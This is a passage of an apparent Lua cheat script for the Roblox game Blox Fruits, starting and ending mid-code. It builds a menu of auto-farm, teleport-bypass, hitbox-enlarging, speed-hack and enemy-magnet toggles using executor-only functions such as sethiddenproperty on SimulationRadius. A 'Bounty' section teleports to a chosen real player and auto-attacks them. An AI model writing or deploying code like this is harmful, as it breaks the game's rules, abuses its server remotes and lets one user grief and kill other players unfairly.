                                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
                                end
                            end
                        end
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(0.5)
                        for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                            if v:IsA("Tool") then
                                if v.ToolTip == "Gun" then -- "Blox Fruit" , "Sword" , "Wear" , "Agility"
                                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
                                end
                            end
                        end
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                    end
                end
            end)
        end
    end
end)

Mys:Toggle("Auto Drive Boat (Seat on boat)",false,function(v)
    _G.DriveBoat = v
end)
spawn(function()
    pcall(function()
        while wait() do
            if _G.DriveBoat and game:GetService("Players").LocalPlayer.Character.Humanoid.Sit == true then
                game:GetService("VirtualInputManager"):SendKeyEvent(true,"W",false,game)
            end
        end
    end)
end)
local iMysticIs = Mys:Label("Load...")
local iMoonIs = Mys:Label("Load...")
spawn(function()
    pcall(function()
        while wait() do
            if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
                getgenv().MysticSp = "Spawn"
            else
                getgenv().MysticSp = "Not Spawn"
            end
            for i,v in pairs(game:GetService("Lighting"):GetChildren()) do  
                if v:IsA("Sky") then
                    if v.MoonTextureId == "http://www.roblox.com/asset/?id=9709149431" then
                        getgenv().MoonIs = "\240\159\140\157 :Full Moon 5/5"
                    elseif v.MoonTextureId == "http://www.roblox.com/asset/?id=9709149052" then
                        getgenv().MoonIs = "\240\159\140\150 :Moon 4/5"
                    elseif v.MoonTextureId == "http://www.roblox.com/asset/?id=9709143733" then
                        getgenv().MoonIs = "\240\159\140\151 :Moon 3/5"
                    elseif v.MoonTextureId=="http://www.roblox.com/asset/?id=9709150401" then
                        getgenv().MoonIs = "\240\159\140\152 :Moon 2/5"
                    elseif v.MoonTextureId=="http://www.roblox.com/asset/?id=9709149680" then
                        getgenv().MoonIs = "\32\240\159\140\156 : Moon 1/5"
                    else
                        getgenv().MoonIs = "\240\159\140\154 : Moon 0/5"
                    end
                end
            end
            iMysticIs:Change("Mirage : "..getgenv().MysticSp)
            iMoonIs:Change(getgenv().MoonIs)
        end
    end)
end)
Mys:Button("Remove Fog (Cant check moon)",function(qww)
    game:GetService("Lighting").LightingLayers:Destroy()
    game:GetService("Lighting").Sky:Destroy()
end)

Mys:Toggle("Tween Mirage Island",false,function(mmm)
    _G.TweenMRIG = mmm
    _G.NChest = mmm
end)
spawn(function()
    pcall(function()
        while wait() do
            if _G.TweenMRIG then
                if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
                    _G.CenterMI = game:GetService("Workspace").Map.MysticIsland.Center.CFrame * CFrame.new(0,300,0)
                    getgenv().ToPos(CFrame.new(_G.CenterMI))
                end
            end
        end
    end)
end)
Mys:Toggle("Tween to Gear",false,function(mgg)
    _G.TweenMGear = mgg
    _G.NChest = mgg
end)
spawn(function()
    pcall(function()
        while wait() do
            if _G.TweenMGear then
                if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
                    for i,v in pairs(game:GetService("Workspace").Map.MysticIsland:GetChildren()) do 
                        if v:IsA("MeshPart")then 
                            if v.Material ==  Enum.Material.Neon then  
                                getgenv().ToPos(v.CFrame)
                            end
                        end
                    end
                end
            end
        end
    end)
end)
function TweenTempleLegit()
    TweenTemple()
    AllNPCS = getnilinstances()
    for r, v in pairs(game:GetService("Workspace").NPCs:GetChildren()) do
        table.insert(AllNPCS, v)
    end
    for r, v in pairs(AllNPCS) do
        if v.Name == "Mysterious Force" then
            TempleMysteriousNPC1 = v
        end
        if v.Name == "Mysterious Force3" then
            TempleMysteriousNPC2 = v
        end
    end
    Tweento(TempleMysteriousNPC2.HumanoidRootPart.CFrame)
    wait(0.5)
    if
        (TempleMysteriousNPC2.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <
            15
        then
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "TeleportBack")
    end
    if
        (TempleMysteriousNPC1.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <
            15
        then
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "Teleport")
    end
end
function CheckAndTweenTemple()
    if (TempleOfTimeCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1200 then
        TweenTemple()
    end
    if (TempleOfTimeCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1200 then
        TweenTemple()
    end
end
function NoFog()
    local c = game.Lighting
    c.FogEnd = 100000
    for r, v in pairs(c:GetDescendants()) do
        if v:IsA("Atmosphere") then
            v:Destroy()
        end
    end
end
function IsMirageIsland2()
    if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
        return true
    else
        return false
    end
end
function getBlueGear()
    if game.workspace.Map:FindFirstChild("MysticIsland") then
        for r, v in pairs(game.workspace.Map.MysticIsland:GetChildren()) do
            if v:IsA("MeshPart") and v.MeshId == "rbxassetid://10153114969" then
                return v
            end
        end
    end
end
function TweentoBlueGear()
    BlueGear = getBlueGear()
    if BlueGear then
        Tweento(BlueGear.CFrame)
    end
end
function PullLever()
    local bn =
        CFrame.new(
        28576.4688,
        14939.2832,
        76.5164413,
        -1,
        0,
        0,
        0,
        0.707134247,
        -0.707079291,
        -0,
        -0.707079291,
        -0.707134247
    )
    local bo =
        CFrame.new(
        28576.4688,
        14935.9512,
        75.469101,
        -1,
        -4.22219593e-08,
        1.13133396e-08,
        0,
        -0.258819044,
        -0.965925813,
        4.37113883e-08,
        -0.965925813,
        0.258819044
    )
    local bp = 0.2
    if
        game:GetService("Workspace").Map["Temple of Time"].Lever.Lever.CFrame.Z > bo.Z + bp or
            game:GetService("Workspace").Map["Temple of Time"].Lever.Lever.CFrame.Z < bo.Z - bp
        then
        CheckAndTweenTemple()
        Tweento(game:GetService("Workspace").Map["Temple of Time"].Lever.Part.CFrame)
        for r, v in pairs(game:GetService("Workspace").Map["Temple of Time"].Lever:GetDescendants()) do
            if v.Name == "ProximityPrompt" then
                fireproximityprompt(v)
            end
        end
    end
end
Mys1:Toggle("Auto Pull Lever",false,function(mgg)
    _G.PULL_lever2F = mgg
end)
spawn(function()
    pcall(function()
        while wait() do
            if _G.PULL_lever2F then
                if game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckTempleDoor") then
                    DaGatCan = true
                else
                    DaGatCan = false
                end
                if _G.PULL_lever2F then
                    local cz = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "Check")
                    if cz == 1 then
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "Begin")
                    elseif cz == 2 then
                        TweenTempleLegit()
                    elseif cz == 3 then
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "Continue")
                    elseif not DaGatCan and not game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckTempleDoor") and IsMirageIsland2() then
                        if getBlueGear() then
                            pcall(
                                function()
                                    HighestPointRealCFrame = getHighestPoint().CFrame * CFrame.new(0, 211.88, 0)
                                end
                            )
                            BlueGear = getBlueGear()
                            if BlueGear and not BlueGear.CanCollide and BlueGear.Transparency ~= 1 then
                                repeat
                                    wait()
                                    TweentoBlueGear()
                                until not getBlueGear() or getBlueGear().Transparency == 1
                                if game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckTempleDoor") then
                                    DaGatCan = true
                                    _G.SeeMoon = false
                                end
                            elseif BlueGear and BlueGear.Transparency == 1 then
                                if HighestPointRealCFrame and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - HighestPointRealCFrame.Position).Magnitude > 10 then
                                    Tweento(HighestPointRealCFrame)
                                elseif HighestPointRealCFrame and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - HighestPointRealCFrame.Position).Magnitude <= 10 then
                                    _G.SeeMoon = true
                                    wait(.1)
                                    game:service("VirtualInputManager"):SendKeyEvent(true, "T", false, game)
                                    task.wait()
                                    game:service("VirtualInputManager"):SendKeyEvent(false, "T", false, game)
                                    task.wait(1.5)
                                end
                            end
                        end
                    end
                elseif DaGatCan then
                    PullLever()
                end
            end
        end
    end)
end)
Mys:Toggle("Lock Camera to Moon",false,function(mgg)
    _G.SeeMoon = mgg
end)
spawn(function()
    pcall(function()
        while wait() do
            if _G.SeeMoon then
                game.Workspace.CurrentCamera.CFrame = CFrame.new(game.Workspace.CurrentCamera.CFrame.Position, game.Workspace.CurrentCamera.CFrame.Position + game.Lighting:GetMoonDirection())
            end
        end
    end)
end)
Section:Toggle("Auto Farm Level",false,function(v)
    _G.Auto_Farm_Level = v
end)
Section:Toggle("Bypass TP Farm Lv",false,function(v)
    _G.By_Pass = v
end)
spawn(function()
    while wait(.1) do
        pcall(function()
            if _G.Auto_Farm_Level then
                _G.AutoFarmL = true
                _G.Auto_Farm = false
                _G.Fast_Farm = false
                _G.Semi_Tp = false
            else
                _G.AutoFarmL = false
                _G.Auto_Farm = false
                _G.Fast_Farm = false
                _G.Semi_Tp = false
            end
        end)
    end
end)
Section:Toggle("Auto Mastery Fruits",false,function(a)
    _G.AuToFarmMasFruits = a
    if _G.AuToFarmMasFruits == false then
        _G.UseSkill = false
    end
end)
_G.KillAt = 36
Section:Toggle("Auto Farm Near",false,function(v)
    _G.AutoFarmNearest = v
end)
Section:Toggle("Auto Farm Candy",false,function(v)
    _G.Auto_Farm_Level = v
end)
spawn(function()
    while wait() do
        if _G.AutoFarmNearest then
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if v.Name and v:FindFirstChild("Humanoid") then
                    if v.Humanoid.Health > 0 then
                        repeat wait()
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                            v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                            v.HumanoidRootPart.Transparency = 1
                            v.Humanoid.JumpPower = 0
                            v.Humanoid.WalkSpeed = 0
                            v.HumanoidRootPart.CanCollide = false
                            FarmPos = v.HumanoidRootPart.CFrame
                            MonFarm = v.Name
                            if v.Humanoid.Health <= 0 and v.Humanoid:FindFirstChild("Animator") then
                                v.Humanoid.Animator:Destroy()
                            end
                            AutoFarmNearestMagnet = true
                            PosMon = v.HumanoidRootPart.CFrame
                        until v.Humanoid.Health <= 0 or (not v.Parent) or _G.AutoFarmNearest == false
                        AutoFarmNearestMagnet = false
                    end
                end
            end
        end
    end
end)
Section10:Toggle("Auto SuperHuman",false,function(v)
    _G.Auto_Superhuman = v
end)
Section10:Toggle("Auto Death Step",false,function(v)
    _G.Auto_Death_Step = v
end)
Section10:Toggle("Auto SharkMan Karate",false,function(v)
    _G.Auto_SharkMan_Karate = v
end)
Section10:Toggle("Auto Electric Claw",false,function(v)
    _G.Auto_Electric_Claw = v
end)
if game.PlaceId == 2753915549 then
    Section:Toggle("Auto New World",false,function(value)
        _G.Sea2 = value
    end)
    
    Section:Toggle("Auto Saber",false,function(value)
        _G.Auto_Saber = value
    end)   
    Section:Toggle("Auto Saber Hop",false,function(value)
        _G.Auto_Saber_Hop = value
    end)  
    elseif game.PlaceId == 4442272183 then
    Section:Toggle("Auto Third World",false,function(value)
        _G.Auto_Third_World  = value
    end)
    Section:Toggle("Auto Rengoku",false,function(value)
        _G.Auto_Rengoku = value
    end)
    Section:Toggle("Auto Factory",false,function(value)
        _G.Auto_Factory_Farm  = value
    end)
    else

        Section:Toggle("Auto Farm Bone",false,function(value)
            _G.Auto_Farm_Bone = value
        end)
    
        Section:Toggle("Auto Random Bone",false,function(value)
            _G.Auto_Random_Bone = value
        end)
        spawn(function()
            pcall(function()
                while wait()do
                    if _G.Auto_Random_Bone then
                        local args = {
                            [1] = "Bones",
                            [2] = "Buy",
                            [3] = 1,
                            [4] = 1
                        }
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                    end
                end
            end)
        end)
        Section:Button("Random Bone",function()
            local args = {
                [1] = "Bones",
                [2] = "Buy",
                [3] = 1,
                [4] = 1
            }
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        end)	
        Section:Toggle("Auto Cake Prince",false,function(value)
            _G.Auto_Cake_Prince = value
        end)
        Section:Label("Kitsune Event")
        Section:Toggle("TP to Kitsune Island",false,function(a)
            _G.TPtoKisuneIs = a
        end)
        Section:Toggle("Auto Collect Azure",false,function(a)
            _G.AutoCollectAzure = a
        end)
        spawn(function()
            while wait() do
                if _G.TPtoKisuneIs then
                    pcall(function()
                        for i,v in pairs(game:GetService("Workspace").Map.KitsuneIsland:GetChildren()) do
                            if v.Name == "Part" then
                                getgenv().ToPos(v.CFrame * CFrame.new(2, 99, 2))
                            end
                        end
                    end)
                end
            end
        end)
        spawn(function()
            while wait() do
                if _G.AutoCollectAzure then
                    pcall(function()
                        for _,v in next, game:GetService("Workspace").EmberTemplate:GetDescendants() do
                            if v.Name == "Part" then
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
                            end
                        end
                    end)
                end
            end
        end)
        local Section5 = Tab:Section("- Elite Hunter -","Left")
        Section5:Toggle("Auto Elite Hunter",_G.Auto_Elite_Hunter,function(v)
            _G.Auto_Elite_Hunter = v    
        end)
        
        Section5:Toggle("Auto Elite Hunter Hop",_G.Auto_Elite_Hunter_Hop,function(v)
            _G.Auto_Elite_Hunter_Hop = v    
        end)
    
        
        Section5:Button("Check Elite Hunter",function(v)
            game.StarterGui:SetCore("SendNotification", {
                Title = "Elite Hunter : "..game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EliteHunter","Progress"), 
                Text = "Check elite killed",
                Duration = 2.5
            })
        end)
        
        
        
        
        
        spawn(function()
            while wait() do
                if _G.Auto_Elite_Hunter then
                    pcall(function()
                        if game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == true then
                            if string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Diablo") or string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Deandre") or string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Urban") then
                                if game:GetService("Workspace").Enemies:FindFirstChild("Diablo") or game:GetService("Workspace").Enemies:FindFirstChild("Deandre") or game:GetService("Workspace").Enemies:FindFirstChild("Urban") then
                                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                        if v.Name == "Diablo" or v.Name == "Deandre" or v.Name == "Urban" then
                                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                repeat wait()
                                                    v.HumanoidRootPart.CanCollide = false
                                                    v.Humanoid.WalkSpeed = 0
                                                    v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                                    game:GetService("VirtualUser"):CaptureController()
                                                    game:GetService("VirtualUser"):Button1Down(Vector2.new(1280,672))
                                                    sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
                                                until _G.Auto_Elite_Hunter == false or v.Humanoid.Health <= 0 or not v.Parent
                                            end
                                        end
                                    end
                                else
                                    if game:GetService("ReplicatedStorage"):FindFirstChild("Diablo") then
                                        getgenv().ToPos(game:GetService("ReplicatedStorage"):FindFirstChild("Diablo").HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                    elseif game:GetService("ReplicatedStorage"):FindFirstChild("Deandre") then
                                        getgenv().ToPos(game:GetService("ReplicatedStorage"):FindFirstChild("Deandre").HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                    elseif game:GetService("ReplicatedStorage"):FindFirstChild("Urban") then
                                        getgenv().ToPos(game:GetService("ReplicatedStorage"):FindFirstChild("Urban").HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                    end
                                end                    
                            end
                        else
                            if _G.Auto_Elite_Hunter_Hop and game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("EliteHunter") == "I don't have anything for you right now. Come back later." then
                                Hop()
                            else
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EliteHunter")
                            end
                        end
                    end)
                end
            end
        end)
    end
spawn(function()
            game:GetService("RunService").Heartbeat:Connect(function()
                pcall(function()
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if _G.Auto_Cake_Prince and StartCakeMagnet and (v.Name == "Cookie Crafter" or v.Name == "Cake Guard" or v.Name == "Baking Staff" or v.Name == "Head Baker") and (v.HumanoidRootPart.Position - POSCAKE.Position).magnitude <= 350 then
                            v.HumanoidRootPart.CFrame = POSCAKE
                            v.HumanoidRootPart.CanCollide = false
                            v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                            if v.Humanoid:FindFirstChild("Animator") then
                                v.Humanoid.Animator:Destroy()
                            end
                            sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                        end
                    end
                end)
            end)
        end)
    
        spawn(function()
            while wait() do
                if _G.Auto_Cake_Prince then
                    pcall(function()
                        if game.ReplicatedStorage:FindFirstChild("Cake Prince") or game:GetService("Workspace").Enemies:FindFirstChild("Cake Prince") then   
                            if game:GetService("Workspace").Enemies:FindFirstChild("Cake Prince") then
                                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do 
                                    if v.Name == "Cake Prince" then
                                        repeat wait()
                                            v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                            v.HumanoidRootPart.CanCollide = false
                                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                            game:GetService'VirtualUser':CaptureController()
                                            game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                        until _G.Auto_Cake_Prince == false or not v.Parent or v.Humanoid.Health <= 0
                                    end    
                                end    
                            else
                                getgenv().ToPos(CFrame.new(-2009.2802734375, 4532.97216796875, -14937.3076171875)) 
                            end
                        else
                            if game.Workspace.Enemies:FindFirstChild("Baking Staff") or game.Workspace.Enemies:FindFirstChild("Head Baker") or game.Workspace.Enemies:FindFirstChild("Cake Guard") or game.Workspace.Enemies:FindFirstChild("Cookie Crafter")  then
                                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do  
                                    if (v.Name == "Baking Staff" or v.Name == "Head Baker" or v.Name == "Cake Guard" or v.Name == "Cookie Crafter") and v.Humanoid.Health > 0 then
                                        repeat wait()
                                            StartCakeMagnet = true
                                            v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)  
                                            POSCAKE = v.HumanoidRootPart.CFrame
                                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                            game:GetService'VirtualUser':CaptureController()
                                            game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                        until _G.Auto_Cake_Prince == false or game:GetService("ReplicatedStorage"):FindFirstChild("Cake Prince") or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            else
                                StartCakeMagnet = false
                                getgenv().ToPos(CFrame.new(-1619.9583740234375, 195.66017150878906, -12307.0380859375))
                            end
                        end
                    end)
                end
            end
        end)
        spawn(function()
            game:GetService("RunService").Heartbeat:Connect(function()
                pcall(function()
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if _G.Auto_Cake_Prince and StartCakeMagnet and (v.Name == "Cookie Crafter" or v.Name == "Cake Guard" or v.Name == "Baking Staff" or v.Name == "Head Baker") and (v.HumanoidRootPart.Position - POSCAKE.Position).magnitude <= 350 then
                            v.HumanoidRootPart.CFrame = POSCAKE
                            v.HumanoidRootPart.CanCollide = false
                            v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                            if v.Humanoid:FindFirstChild("Animator") then
                                v.Humanoid.Animator:Destroy()
                            end
                            sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                        end
                    end
                end)
            end)
        end)
    
        spawn(function()
            while wait() do
                if _G.Auto_Cake_Prince then
                    pcall(function()
                        if game.ReplicatedStorage:FindFirstChild("Cake Prince") or game:GetService("Workspace").Enemies:FindFirstChild("Cake Prince") then   
                            if game:GetService("Workspace").Enemies:FindFirstChild("Cake Prince") then
                                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do 
                                    if v.Name == "Cake Prince" then
                                        repeat wait()
                                            v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                            v.HumanoidRootPart.CanCollide = false
                                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                            game:GetService'VirtualUser':CaptureController()
                                            game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                        until _G.Auto_Cake_Prince == false or not v.Parent or v.Humanoid.Health <= 0
                                    end    
                                end    
                            else
                                getgenv().ToPos(CFrame.new(-2009.2802734375, 4532.97216796875, -14937.3076171875)) 
                            end
                        else
                            if game.Workspace.Enemies:FindFirstChild("Baking Staff") or game.Workspace.Enemies:FindFirstChild("Head Baker") or game.Workspace.Enemies:FindFirstChild("Cake Guard") or game.Workspace.Enemies:FindFirstChild("Cookie Crafter")  then
                                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do  
                                    if (v.Name == "Baking Staff" or v.Name == "Head Baker" or v.Name == "Cake Guard" or v.Name == "Cookie Crafter") and v.Humanoid.Health > 0 then
                                        repeat wait()
                                            StartCakeMagnet = true
                                            v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)  
                                            POSCAKE = v.HumanoidRootPart.CFrame
                                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                            game:GetService'VirtualUser':CaptureController()
                                            game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                        until _G.Auto_Cake_Prince == false or game:GetService("ReplicatedStorage"):FindFirstChild("Cake Prince") or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            else
                                StartCakeMagnet = false
                                getgenv().ToPos(CFrame.new(-1619.9583740234375, 195.66017150878906, -12307.0380859375))
                            end
                        end
                    end)
                end
            end
        end)
local P2a = Tab2:Section("- Combat -","Right")
local BountyEz = Tab2:Section("- Bounty -","Left")
BountyEz:Toggle("Auto Open PVP",false,function(v)
    _G.PVPopenIts = v    
end)
spawn(function()
    pcall(function()
        while wait() do
            if _G.PVPopenIts then
                if game:GetService("Players")["LocalPlayer"].PlayerGui.Main.PvpDisabled.Visible == true then
                    local args = {
                        [1] = "EnablePvp"
                    }
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                end
            end
        end
    end)
end)

Plrs = {}
for i,v in pairs(game:GetService("Players"):GetChildren()) do  
    table.insert(Plrs ,v.Name)
end
local SelectPlayerYo = BountyEz:Dropdown("Select Player",Plrs,{"Select Target"},function(v)
    _G.Playeras = v
end)
BountyEz:Button("Refresh Player",function()
    SelectPlayerYo:Clear()
    for i,v in pairs(game:GetService("Players"):GetChildren()) do  
        SelectPlayerYo:Add(v.Name)
    end
end) 
BountyEz:Toggle("Kill Target",false,function(v)
    _G.AFdf = v    
end)
BountyEz:Label("** Use with electric claw")
function asbypasstp(p)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p
end
BountyEz:Button("Suck Target",function()
    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if v:IsA("Tool") then
            if v.ToolTip == "Melee" then
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))
            end
        end
    end
    local TargetB = _G.Playeras
    local PositionPS = game:GetService("Players")[TargetB].Character.HumanoidRootPart.CFrame
    asbypasstp(PositionPS)
    game:GetService("VirtualInputManager"):SendKeyEvent(true,"X",false,game)
    game:GetService("VirtualInputManager"):SendKeyEvent(false,"X",false,game)
end) 
spawn(function()
    while wait() do
        pcall(function()
            if _G.AFdf then
                local TargetB = _G.Playeras
                local PositionPS = game:GetService("Players")[TargetB].Character.HumanoidRootPart.CFrame
                getgenv().ToPos(PositionPS*CFrame.new(0,8,0))
            end
        end)
    end
end)
spawn(function()
    while wait() do
        pcall(function()
            if _G.AFdf then
                wait()
                game:GetService("VirtualInputManager"):SendKeyEvent(true,"Z",false,game)
                game:GetService("VirtualInputManager"):SendKeyEvent(false,"Z",false,game)
                wait()
                game:GetService("VirtualInputManager"):SendKeyEvent(true,"X",false,game)
                game:GetService("VirtualInputManager"):SendKeyEvent(false,"X",false,game)
                wait()
                game:GetService("VirtualInputManager"):SendKeyEvent(true,"C",false,game)
                game:GetService("VirtualInputManager"):SendKeyEvent(false,"C",false,game)
                wait()
                game:GetService("VirtualInputManager"):SendKeyEvent(true,"V",false,game)
                game:GetService("VirtualInputManager"):SendKeyEvent(false,"V",false,game)
            end
        end)
    end
end)
spawn(function()
    while wait() do
        pcall(function()
            if _G.AFdf then
                wait(5)
                game:GetService("VirtualInputManager"):SendKeyEvent(true,"One",false,game)
                game:GetService("VirtualInputManager"):SendKeyEvent(false,"One",false,game)
                wait(5)
                game:GetService("VirtualInputManager"):SendKeyEvent(true,"Two",false,game)
                game:GetService("VirtualInputManager"):SendKeyEvent(false,"Two",false,game)
                wait(5)
                game:GetService("VirtualInputManager"):SendKeyEvent(true,"Three",false,game)
                game:GetService("VirtualInputManager"):SendKeyEvent(false,"Three",false,game)
                wait(5)
                game:GetService("VirtualInputManager"):SendKeyEvent(true,"Four",false,game)
                game:GetService("VirtualInputManager"):SendKeyEvent(false,"Four",false,game)
            end
        end)
    end
end)
spawn(function()
    while wait() do
        pcall(function()
            if _G.AFdf then
                Attack()
            end
        end)
    end
end)
P2a:Toggle("Auto Active Race v3",false,function(v)
    _G.Rv3 = v    
end)
P2a:Toggle("Auto Active Race v4",false,function(v)
    _G.Rv4 = v    
end)
P2a:Toggle("Aura Attack",false,function(v)
    _G.AccsF = v    
end)
P2a:Toggle("Tween to Save Place",false,function(v)
    _G.SaveModeSS = v    
end)
spawn(function()
    while wait() do
        pcall(function()
            if _G.SaveModeSS then
                local MeIs = game.Players.LocalPlayer.Name
                local MePosIs = game:GetService("Players")[MeIs].Character.HumanoidRootPart.CFrame
                getgenv().ToPos(MePosIs*CFrame.new(0,30,0))
            end
        end)
    end
end)
spawn(function()
    while wait() do
        pcall(function()
            if _G.AccsF then
                Attack()
            end
        end)
    end
end)
spawn(function()
    while wait() do
        pcall(function()
            if _G.Rv3 then
                game:GetService("VirtualInputManager"):SendKeyEvent(true,"T",false,game)
                game:GetService("VirtualInputManager"):SendKeyEvent(false,"T",false,game)
            end
        end)
    end
end)
spawn(function()
    while wait() do
        pcall(function()
            if _G.Rv4 then
                game:GetService("VirtualInputManager"):SendKeyEvent(true,"Y",false,game)
                game:GetService("VirtualInputManager"):SendKeyEvent(false,"Y",false,game)
            end
        end)
    end
end)
spawn(function()
    while wait() do
        pcall(function()
            if _G.GsE then
                game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = 300
                game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = 300
                game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = 300
            end
        end)
    end
end)
P2a:Toggle("Infinit Range Observation",false,function(v)
    _G.Infinit_Range_Observation_Haki = v
end)
spawn(function()
    while wait() do
        if _G.Infinit_Range_Observation_Haki then
            game.Players.LocalPlayer.VisionRadius.Value = math.huge
        end
    end
end)

local Shop1 = Tab3:Section("- Melee -","Left")
local Shop2 = Tab3:Section("- Fruit -","Right")
local Shop3 = Tab3:Section("- Ability -","Right")
local Shop4 = Tab3:Section("- Sword -","Left")
local Shop5 = Tab3:Section("- Gun -","Right")
Shop1:Button("Buy Black Leg",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBlackLeg")
end)
Shop1:Button("Buy Electro",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectro")
end)
Shop1:Button("Buy Fishman Karate",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyFishmanKarate")
end)
Shop1:Button("Buy DragonClaw",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","1")
